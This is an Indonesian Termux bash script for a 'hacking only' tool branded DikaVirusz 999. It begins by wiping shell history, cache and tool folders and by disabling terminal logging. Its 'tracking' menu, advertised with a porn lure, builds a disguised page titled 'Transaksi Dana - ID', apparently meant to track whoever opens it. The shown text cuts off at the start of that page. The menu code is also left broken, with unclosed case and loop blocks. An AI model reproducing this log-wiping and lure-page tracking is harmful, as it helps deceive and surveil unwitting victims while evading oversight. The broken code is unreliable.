#!/bin/bash

set +o history
for dir in DikxaTracker DikxaIG DikxaFF DikxaTT DikxaSpin DikxaTTSuntik DikxaPro DikxaInject; do
  rm -rf "$HOME/$dir" 2>/dev/null
done
history -c 2>/dev/null
history -w 2>/dev/null
rm -rf ~/.cache/* 2>/dev/null
rm -rf ~/.tmp/* 2>/dev/null
[ ! -f ~/.termux/termux.properties ] && mkdir -p ~/.termux
echo "disable-logging = true" >> ~/.termux/termux.properties 2>/dev/null
set -o history


# Kode warna untuk teks
<<EOF
NC="\033[0m"
BLUE='\033[1;94m'
GREEN='\033[38;5;82m'
RED='\033[38;5;196m'
CYAN='\033[1;96m'
YELLOW='\033[1;93m'
MAGENTA='\033[1;95m'
WHITE='\033[1;97m'
EOF

RED='\033[38;5;196m'
GREEN='\033[38;5;40m'
YELLOW='\033[38;5;226m'
BLUE='\033[38;5;21m'
MAGENTA='\033[38;5;165m'
CYAN='\033[38;5;51m'
BOLD='\033[1m'
RESET='\033[0m'

color() {
  local color_code=$1
  local text=$2

  case "$color_code" in
    red)    printf "${RED}%s${NC}\n" "$text" ;;
    green)  printf "${GREEN}%s${NC}\n" "$text" ;;
    yellow) printf "${YELLOW}%s${NC}\n" "$text" ;;
    blue)   printf "${BLUE}%s${NC}\n" "$text" ;;
    magenta)printf "${MAGENTA}%s${NC}\n" "$text" ;;
    cyan)   printf "${CYAN}%s${NC}\n" "$text" ;;
    white)  printf "${WHITE}%s${NC}\n" "$text" ;;
    *)      printf "%s${NC}\n" "$text" ;; # Default: No color
  esac
}

A() { echo '╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮';}
B() { echo '╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯';}
C() { echo '│'; }

# Kode warna untuk latar belakang
BG_BLUE='\033[1;44m'
BG_GREEN='\033[1;42m'
BG_RED='\033[1;41m'
BG_CYAN='\033[1;46m'
BG_YELLOW='\033[1;43m'
BG_MAGENTA='\033[1;45m'
BG_WHITE='\033[1;47m'

R='\033[1;31m'
G='\033[1;32m'
B='\033[1;34m'
Y='\033[1;33m'
W='\033[1;37m'
D='\033[0;37m'
RESET='\033[0m'

# Kode untuk mengatur gaya teks
BOLD='\033[1m'
UNDERLINE='\033[4m'
BLINK='\033[5m'

# Kode untuk menghapus warna dan gaya
NC='\033[0m'

#WHATSAPP_CHANNEL_URL="https://whatsapp.com/channel/0029VaznZlq7z4kW00unHZ0e"
YOUTUBE_URL="https://www.youtube.com/@ByexeOfficial"
LAGU_YOUTUBE="https://youtu.be/MunnYFmqWYo" # URL Lagu
LAPOR_TOOLS_ERROR="https://wa.me/6285741852394?text=*LAPOR TOOLS ERROR BANG*"
loading() {
trap 'tput cnorm; kill $! 2>/dev/null' EXIT  # restore cursor & kill animasi
tput civis  # sembunyikan cursor

frames=(
'[ ░░░░░░░░░░ ] 0 %  |  INITIALIZING CORE...'
'[ █░░░░░░░░░ ] 10 % |  INJECTING PAYLOAD...'
'[ ██░░░░░░░░ ] 20 % |  BYPASSING FIREWALL...'
'[ ███░░░░░░░ ] 30 % |  CRACKING HASH...'
'[ ████░░░░░░ ] 40 % |  SPREADING ROOTKIT...'
'[ █████░░░░░ ] 50 % |  EXFILTRATING DATA...'
'[ ██████░░░░ ] 60 % |  CLEANING LOGS...'
'[ ███████░░░ ] 70 % |  SPOOFING ORIGIN...'
'[ ████████░░ ] 80 % |  LOCKING BACKDOOR...'
'[ █████████░ ] 90 % |  FINALIZING...'
'[ ██████████ ] DONE |  SYSTEM READY!'
)
total=${#frames[@]}
for ((i=0;i<total;i++)); do
    printf "\r\033[32m%s\033[0m" "${frames[i]}"
    sleep 0.4
done
echo -e "\n"
tput cnorm  # tampilkan cursor lagi
}
command_exists() {
  command -v "$1" >/dev/null 2>&1
}

banner() {
  if command_exists figlet; then
    clear
    toilet -f slant   "     Loading     " --filter border | lolcat
    echo -e "                    ${BG_RED}${YELLOW}SABAR CUY BENTAR DOANG KOK${NC}"
  else
  sleep 2
    clear
    echo -e "${CYAN}===== DikxaTools =====${NC}"
  fi
  #echo -e "${BLUE}"
  #echo "     ╭────────────────────────────────────╮" | lolcat
 # echo "     │    [] LOADING SABAR YHA CUY []   │" | lolcat
 # echo "     ╰────────────────────────────────────╯" | lolcat
  echo -e "${RED}" | lolcat
  sleep 1
  clear
#  loading
  clear
  if command_exists figlet; then
    toilet -f slant "  FluxyTools  " --filter border | lolcat
    echo -e "      ┃ TOOLS INI DI BUAT & DI KEMBANGKAN OLEH Dikxa OFFICIAL ┃"
    echo -e "      ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ "
   
  else
    echo -e "${CYAN}=====DIKAVIRUSZ =====${NC}"
 #   loading | lolcat
    sleep 1
  fi
}

Ben() {
echo -e " ${RED}
┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮ 
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⢠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀           ${GREEN}2${RED}     │
│⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡟⢦⠀⠀⠀⠀⠀⠀⠀⠀⢀⣞⣏⣀⣀⠀⠀⠀⠀⠀⠀${GREEN}3${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⢀⡴⢺⡿⠛⠉⡇⠈⡇⠀⠀⠀⠀⠀⠀⢀⡟⠘⡇⠉⠻⣝⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}2${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⡞⡟⠀⠀⣠⠇⢠⡇⠀⠀⠀⠀⠀⠀⠈⣷⢀⣳⡀⠀⠘⡎⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ${GREEN}1${RED}       │
│⠀⠀⠀⠀${GREEN}4${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}3${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡃⣇⣇⣀⡴⣫⢆⡞⠀⠀⠀⣀⣀⣀⡀⠀⠘⣦⠱⣿⢦⣀⣿⡀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}9${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⡙⠒⠖⠋⢁⡯⢶⣶⣨⡻⠿⡿⠿⣿⣼⣴⠾⣧⠈⠓⠲⠚⣣⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀${GREEN}6${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⡣⣄⠀⠨⣯⣿⢟⣷⠹⣿⣾⡾⢻⡿⣿⣿⡿⠃⠀⣤⡾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          ${GREEN}0${RED}      │
│⠀⠀⠀⠀⠀${GREEN}6${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠀⢀⢿⣟⡆⠀⠻⣯⣿⠏⢠⣿⣿⣧⠈⢿⣿⠿⠃⠀⣼⣿⣷⣄⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}4${RED}                │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}7${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣆⣟⣾⢻⣾⡀⠀⠀⢀⣴⣿⡇⣿⡟⣷⣄⡀⠀⠀⢰⣿⣧⢻⣟⣾⢧⠀⠀⠀⠀⠀⠀${GREEN}7${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     ${GREEN}6${RED}           │
│⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⡀⢸⠈⢿⣾⣧⣿⣻⣧⠀⠀⡿⣿⢸⣧⣿⡇⣿⢿⡇⠀⠀⣿⣿⢻⣏⣿⡇⢸⡄⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀               ${GREEN}0${RED} │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣾⡹⣿⡇⠘⢿⣾⣏⡿⠁⠀⢸⢧⣿⣼⣟⣿⡇⣿⢸⣿⠀⠐⢿⣿⣏⣿⠿⠀⣼⣧⣾⣳⣿⣷⣌⠳⣄⠀⠀⠀⠀⠀⠀⠀${GREEN}3${RED}⠀⠀⠀              ${GREEN}8${RED}  │
│⠀⠀⠀⠀⠀⠀${GREEN}4${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣟⠻⠙⣿⣷⢹⣿⣦⡀⠀⠁⠀⠀⠀⠈⢿⣇⣿⡿⣿⡇⣿⣿⠟⠀⠀⠀⠀⠀⠀⣀⣾⣿⡟⢸⣿⡟⠹⣿⣷⢹⡆⠀⠀⠀                ${GREEN}0${RED}       │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}2${RED}⠀⠀⠀⠀⠀⠀⢿⡹⣿⣇⢠⠟⣿⢠⣿⣿⣿⣷⣶⣢⣤⡀⠀⠀⠉⠛⠛⠛⠓⠋⠁⠀⠀⢠⣶⣶⣶⣾⣿⢹⣿⡇⢸⡍⢧⠀⣿⡟⣼⠇${GREEN}1${RED}⠀⠀⠀                       │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⣜⠿⣾⠟⣡⣾⣿⡿⣿⣇⣿⣟⣿⣷⣆⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣻⡗⣿⣏⣿⡾⣿⡿⢦⠙⣾⡾⢋⡴⠁⠀⠀⠀              ${GREEN}9${RED}          │
│⠀⠀⠀⠀⠀${GREEN}3${RED}⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⣦⣼⣷⣀⡍⠳⣄⡀⠉⡉⠉⠙⠳⢿⣲⣦⠄⠀⢤⣴⣾⠿⠛⠋⠉⠉⣉⠁⢀⡴⢋⣀⡼⣷⣤⡖⠋⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀                 │ 
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}1${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⢿⣟⠿⠤⠀⠑⣾⠃⠀⠀⠀⠀⠀⠈⡏⣿⢻⠁⠀⠀⠀⠀⠀⠀⢹⡴⠁⠀⠼⠟⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 │ 
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}8${RED}⠀⠀⠀⠀⠀⣼⠿⠿⣿⢿⣽⣂⣀⡀⠀⠿⣦⡀ ${RED}0${RED}⠀⢆⠀⣇⣿⣼⠀⡄⠀${RED}0${RED}⠀⠀⣠⡿⠇⠀⣀⣀⣾⣿⣿⡿⠻⢿⡄⠀⠀⠀⠀⠀⠀${GREEN}5${RED}⠀⠀⠀⠀⠀                 │
│⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⣾⡆⣿⢸⣿⣿⣿⣿⣷⣶⣶⣯⣷⣦⣤⣼⣶⣿⣿⣿⣾⣧⣤⣤⣴⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⡇⣶⡾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⡵⣿⣿⣿⣿⣿⣿⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠋⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢸⣿⣿⣿⣜⢷⣻⣥⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${GREEN}0${RED}            │
│⠀⠀⠀⠀⠀⠀${GREEN}5${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⣿⡿⣿⣿⣿⢿⣿⣛⣻⡄⠈⠉⠙⠿⣿⣿⢿⣯⡷⣝⢦⣞⡾⣼⣿⢿⣿⣿⠋⠉⡇⠈⣟⢻⣿⣿⢿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀${GREEN}3${RED}⠀⠀⠀⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢻⣿⣾⣿⣿⣿⣿⣿⣷⠔⠒⠲⢤⣁⣩⣏⣡⡹⣌⠛⣣⠞⣄⣙⣄⣉⣤⠿⢒⡛⢻⣿⣻⣿⣿⣿⣿⣿⣟⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}2${RED}⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡻⢿⣿⣿⣿⣿⡄⡄⢋⣵⣛⠟⠛⠛⠷⣌⣉⣁⡾⠟⠛⠻⣿⣋⣙⢻⣹⣿⣿⣿⣿⣿⠿⣻⣿⡟⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀             ${GREEN}0${RED}    │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}6${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡟⣽⣾⣿⣿⣿⣿⣿⠀⣆⠈⣿⣗⡦⢤⡤⠬⣭⠥⠤⡤⢤⣾⣿⡇⢸⠄⢻⣿⣟⣿⣿⣿⣦⡽⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}4${RED}⠀⠀              ${GREEN}7${RED}  │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}4${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠋⠹⣿⣿⣿⣿⣿⣟⣿⢠⣿⣿⣿⣾⣷⣶⣿⣶⣶⣷⣾⣿⣿⣧⢸⣤⣿⣿⣿⣿⣿⡇⠉⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀          ${GREEN}0${RED}      │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⣍⢻⣿⣿⡷⣾⡛⢯⣹⡉⣻⣛⣿⣛⣿⠉⣻⡹⠛⣿⣾⣿⣿⡟⣻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}                │
│⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⠿⠟⠛⢇⣿⣙⠂⠚⠛⣉⣀⣀⣀⣨⡛⠓⠐⢚⣽⣹⠛⠛⠿⠮⠿⠁⠀⠀⠀⠀${GREEN}1${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀           ${GREEN}5${RED}     │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}2${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⠙⠳⡖⠚⡋⠀⠀⠀⠈⡛⠒⡶⠋⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ${GREEN}2${RED}              │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠀⠀⠙⢦⣀⠀⠀⢀⣠⣴⠞⠁⠀⠘⠃⠀⠀⠀⠀⠀${GREEN}4${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              ${GREEN}0${RED}  │
│⠀⠀⠀ ⠀⠀⠀⠀⠀${GREEN}3${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⠶⠾⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀                 │
│         ⠀⠀⠀                       ${RED}[    ${WHITE}${UNDERLINE}${BOLD} DIKAVIRUSZ 999 ${NC}${RED}    ]${RED}                              ${GREEN}7${RED}    │
│           ${GREEN}6${RED}                ${GREEN}0${RED}                                ${GREEN}0${RED}                         ${GREEN}8${RED}          │
│                       ⠀⠀⠀    ${GREEN}8${RED}       ${RED}[   ${WHITE}${BOLD} DARK MENU ${NC}${RED}    ]${RED}          ${GREEN}0${RED}                     ${GREEN}0${RED}       │
│          ${GREEN}0${RED}                ⠀⠀⠀      ${RED}[    ${WHITE}${BOLD} HACKING ONLY ${NC}${RED}    ]${RED}                                  ${GREEN}9${RED}   │
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ "
   

echo -e "                                                                                                                           "
echo -e "                                                                                                                           "
}
spasi() {
echo "                                                "
echo "                                                "
}
tangal_tahun() {
    local hour=$(date +%H)
    hour=${hour#0}            # <-- tambahkan ini
    local greeting

    if (( hour >= 5 && hour < 12 )); then
        greeting="PAGI KAK"
    elif (( hour >= 12 && hour < 15 )); then
        greeting="SIANG KAK"
    elif (( hour >= 15 && hour < 18 )); then
        greeting="SORE KAK"
    else
        greeting="MALAM KAK"
    fi

    local tgl
    if date --version >/dev/null 2>&1; then
        tgl=$(date '+%A, %d/%B/%Y')
    else
        tgl=$(date '+%A, %d/%B/%Y')
    fi

    tgl=$(sed -E \
      -e 's/Monday/SENIN/g; s/Tuesday/SELASA/g; s/Wednesday/RABU/g' \
      -e 's/Thursday/KAMIS/g; s/Friday/JUM’AT/g; s/Saturday/SABTU/g' \
      -e 's/Sunday/MINGGU/g' \
      -e 's/January/JANUARI/g; s/February/FEBRUARI/g; s/March/MARET/g' \
      -e 's/April/APRIL/g; s/May/MEI/g; s/June/JUNI/g' \
      -e 's/July/JULI/g; s/August/AGUSTUS/g; s/September/SEPTEMBER/g' \
      -e 's/October/OKTOBER/g; s/November/NOVEMBER/g; s/December/DESEMBER/g' \
      <<< "$tgl")

    echo "$greeting, $tgl"
}

# Variabel global untuk kontrol sound
SOUND_ENABLED=true

klik() {
    if [ "$SOUND_ENABLED" = true ]; then
        curl -sL https://github.com/11404d/1/raw/refs/heads/main/klik.mp3 | \
        play -q -t mp3 -
    fi
}
# Fitur untuk mematikan sound
OFF_KLIK() {
    SOUND_ENABLED=false
}

# Fitur untuk menghidupkan sound lagi
ON_KLIK() {
    SOUND_ENABLED=true
}


# letakkan di bagian global (atas) script supaya tersedia untuk semua fungsi
SOUND_SALAH_ENABLED=true

salah() {
  # hanya mainkan sound jika enabled
  if [ "${SOUND_SALAH_ENABLED}" = true ]; then
    curl -sL https://github.com/11404d/1/raw/refs/heads/main/pilihanSalah.mp3 | \
    play -q -t mp3 - 2>/dev/null
  fi
}

disableSalah() {
  SOUND_SALAH_ENABLED=false
}

enableSalah() {
  SOUND_SALAH_ENABLED=true
}

toggleSalah() {
  if [ "${SOUND_SALAH_ENABLED}" = true ]; then
    disableSalah
  else
    enableSalah
  fi
}


hello() {
    # auto-install sox jika belum ada
    if ! command -v play &>/dev/null; then
        echo -e "\033[1;33m[ + ] INSTALL SOX\033[0m"
        pkg install -y sox >/dev/null 2>&1
    fi
    echo -e "${RED}
_|_|_|    _|  _|                              _|_|      _|_|      _|_|
_|    _|      _|  _|    _|    _|    _|_|_|  _|    _|  _|    _|  _|    _|
_|    _|  _|  _|_|        _|_|    _|    _|    _|_|_|    _|_|_|    _|_|_|
_|    _|  _|  _|  _|    _|    _|  _|    _|        _|        _|        _|
_|_|_|    _|  _|    _|  _|    _|    _|_|_|  _|_|_|    _|_|_|    _|_|_|         [ ${RED}999${NC} ]
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat
    local txt=" HALLO BRO SELAMAT DATANG DI DIKAVIRUSZ 999 "
    local delay=0.04
    local len=${#txt}

    # play sound (skip jika gagal)
    curl -sL --max-time 4 \
        https://github.com/11404d/1/raw/refs/heads/main/welcome.mp3 \
        2>/dev/null | play -q -t mp3 - &

    # type-writer effect
    for ((i=0; i<=len; i++)); do
        printf "\r\033[1;93;41m%${i}s\033[0m" "${txt:0:i}"
        sleep "$delay"
    done
    printf "\n"
}



show_menu() {
your_id="$(whoami)"
greeting="$(tangal_tahun)"
# lebar di dalam kedua │ = 49 karakter
g_pad=$((49 - ${#greeting} - 1))   # -1 untuk 1 spasi setelah │
g_spaces=$(printf '%*s' $((g_pad > 0 ? g_pad : 0)) '')

#echo -e "                  ${BG_RED}${YELLOW} WELCOME TO ALL MENU ${NC}"

echo -e "${GREEN}
 ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
 │ █████████░█████████████████████░░████████████████████░█████████ │
 ├─────────────────────────────────────────────────────────────────┤
 │ ${YELLOW}${greeting}${g_spaces}${GREEN}                │
 ├─────────────────────────────────────────────────────────────────┤
 │ ${YELLOW}Your ID: ${your_id}          ${YELLOW}YT${NC}: ${RED}DikxaViruszV2       TT${NC}:dikxavirusz999${NC}${GREEN}    │
 ╰─────────────────────────────────────────────────────────────────╯${NC}
 ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
 │                     ${YELLOW}~ 𝐃𝐢𝐤𝐱𝐚𝐕𝐢𝐫𝐮𝐬𝐳𝟗𝟗𝟗 ~${NC}${GREEN}                   │
 ├────────────┬─────────────────────────┬────────────┬─────────────┤
 ╠                        ${RED}𝐄𝐍𝐂 𝐌𝐄𝐍𝐔 | 𝐀𝐊𝐒𝐄𝐒 𝐆𝐀𝐆𝐀𝐋.${NC}                                 │
 ├────────────┴─────────────────────────┴──────────────────────────┤
 │                 𝐃𝐢𝐤𝐱𝐚𝐕𝐢𝐫𝐮𝐬𝐳𝟗𝟗𝟗                      𝐂𝐲𝐛𝐞𝐫𝐁𝐚𝐢𝐤                                    │
 ├─────────────────────────────────────────────────────────────────┤
 ╰─────────────────────────────────────────────────────────────────╯" | lolcat
  #echo -e "${CYAN}"
  #echo "     ╭─══════════════════════════════════─╮"
  #echo "     │    [] ALL MENU DIKAVIRUSZ []    │"
  #echo "     ╰─══════════════════════════════════─╯"
  #echo -e "${NC}"
   echo -e "  ${GREEN}● ${YELLOW}● ${RED}●"
   echo -e "  ${WHITE}DEVELOPER: ${BG_RED}${YELLOW}𝐃𝐢𝐤𝐱𝐚𝐕𝐢𝐫𝐮𝐬𝐳𝟗𝟗𝟗${NC}"
}
clear

main_menu() {
  play_music
  hello
  while true; do
    klik
    banner
    show_menu
    printf "${GREEN}  ┏━[ ${RED}𝐃𝐢𝐤𝐱𝐚𝐕𝐢𝐫𝐮𝐬𝐳𝟗𝟗𝟗${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
        read -r Fluxy

    case $Fluxy in
    
   01|1)
   klik
      menu_tracking
      klik
      ;;
}
menu_tracking() {
  while true; do
clear
  if command_exists figlet; then
    figlet -f slant " Tracking" | lolcat
  else
    echo -e "${CYAN}  ===== DikxaTols =====${NC}"
    sleep 1
    clear
  fi
     echo -e "  ${BG_RED}${YELLOW}MENU 𝐁𝐎𝐊𝐄𝐏 DIKAVIRUSZ${NC}"
     echo -e "
 ╭───────────────────────────────────────────────╮
 │                                               │
 ╭─────────────┬────────────────────────────┬────╮
 │                      𝐂𝐀𝐑𝐈 𝐁𝐎𝐊𝐄𝐏 𝐀𝐉𝐀 𝐃𝐄𝐊                     │
 ╰─────────────┴────────────────────────────┴────╯
 │                        𝐋𝐎 𝐊𝐀𝐘𝐀 𝐊𝐎𝐍𝐓𝐎𝐋                       │
 ╰───────────────────────────────────────────────╯" | lolcat
   echo -e "${GREEN}● ${YELLOW}● ${RED}●"
   echo -e "${WHITE}DEVELOPER: ${BG_GREEN}${RED}Dikxa OFFICIAL✓${NC}"
        printf "${GREEN}┏━[ ${RED}DIKAVIRUSZ 999${NC} ${GREEN}]${YELLOW}@termux${RED} ~${NC}${RED}[${YELLOW} TRACKING ${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
        read -r pilih

    case $pilih in
    
        01|1)
        klik
        track_live
        klik
        ;;
      00|0)
      klik
        echo "CLOSE MENU 2" | lolcat
        break
        klik
        ;;
      *)
        echo "INPUT TIDAK VALID!" | lolcat
        salah
        ;;
    esac

    echo ""
    read -p "ENTER UNTUK KEMBALI KE MENU" | lolcat
    klik
  done
}

track_live() {
mkdir -p DikxaTracker
cd DikxaTracker

# === HTML AR GAME TRANSPARAN ===
cat > index.html <<'EOF'
     <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Transaksi Dana - ID</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
